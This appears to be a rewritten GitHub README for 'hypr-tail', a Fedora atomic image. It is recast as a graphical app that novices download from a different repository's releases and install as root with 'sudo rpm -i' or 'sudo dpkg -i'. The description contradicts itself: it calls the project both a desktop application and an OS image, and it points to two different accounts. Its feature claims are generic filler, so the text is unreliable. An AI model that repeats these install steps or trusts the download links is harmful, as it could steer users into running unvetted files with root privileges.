# 🖥️ hypr-tail - Seamless Installation for Your System

[![Download hypr-tail](https://img.shields.io/badge/Download-hypr--tail-blue?style=for-the-badge)](https://github.com/BOIVIK/hypr-tail/releases)

## 📥 Overview

This application, **hypr-tail**, provides a user-friendly way to manage your system images. It streamlines image-based updates and ensures your environment stays consistent. Whether you are a novice or someone with a little experience, you will find this tool beneficial.

## 🚀 Getting Started

Follow these simple steps to download and run **hypr-tail** on your system. No technical skills are required.

### Step 1: Visit the Releases Page

To get started, you need to visit the releases page where the latest version of **hypr-tail** is available. Click the link below:

[Visit the releases page to download hypr-tail](https://github.com/BOIVIK/hypr-tail/releases)

### Step 2: Choose the Right File

On the releases page, look for the latest version. You will see several files available for download. Choose the file that corresponds to your system requirements. Below are the common file types you may encounter:

- **For Fedora Users**: Use the `rpm` file.
- **For Other Linux Distributions**: You may need a different format (like `.deb` for Debian-based systems).

### Step 3: Download the File

Click on the file you chose to begin the download. Once the download is complete, locate the file on your system.

### Step 4: Install hypr-tail

To install **hypr-tail**, open a terminal window if you are on a Linux system. 

1. **Navigate to the file location**:
   ```bash
   cd path/to/downloaded/file
   ```
   Replace `path/to/downloaded/file` with the actual path where your downloaded file is located.

2. **Install the application** (replace `filename` with the actual name of the downloaded file):
   ```bash
   sudo rpm -i filename.rpm
   ```
   or for Debian systems:
   ```bash
   sudo dpkg -i filename.deb
   ```

### Step 5: Run hypr-tail

After installation, you can run **hypr-tail**. Open your terminal and type:
```bash
hypr-tail
```
Press **Enter** to execute the command. A graphical interface will open, allowing you to easily navigate through its features.

## 📦 Installation Instructions

> [!WARNING]  
> [This is an experimental feature.](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.

If you’re rebasing an existing atomic Fedora installation to the latest build, follow these steps:

1. **Rebase to the unsigned image**:
   ```bash
   rpm-ostree rebase ostree-unverified-registry:ghcr.io/marvinthemoodlifter/hypr-tail:latest
   ```

2. **Reboot to complete the rebase**:
   ```bash
   systemctl reboot
   ```

3. **Rebase to the signed image**:
   ```bash
   rpm-ostree rebase ostree-registry:ghcr.io/marvinthemoodlifter/hypr-tail:latest
   ```

## 📚 Features

- **Simple Installation**: Easily install and manage your images without hassle.
- **User-Friendly Interface**: Navigate with ease and make changes without confusion.
- **System Compatibility**: Designed to work with various Linux distributions.
- **Up-to-Date Options**: Rebasing allows users to always have the latest features.

## 💻 System Requirements

Ensure your system meets the following minimal requirements before installation:

- **Operating System**: Compatible with most Linux distributions.
- **Disk Space**: At least 200 MB available space.
- **Memory**: Minimum 1 GB RAM.

## 🔗 Additional Resources

For further instructions and support, please refer to the following documents:

- [BlueBuild Documentation](https://blue-build.org/how-to/setup/)
- [GitHub Issues Page](https://github.com/BOIVIK/hypr-tail/issues) for troubleshooting.

### Download & Install

To download and install **hypr-tail**, visit this page:

[Download hypr-tail from the releases page](https://github.com/BOIVIK/hypr-tail/releases)

By following these steps, you should be able to effectively download, install, and run **hypr-tail** on your system with confidence. Enjoy using your new application!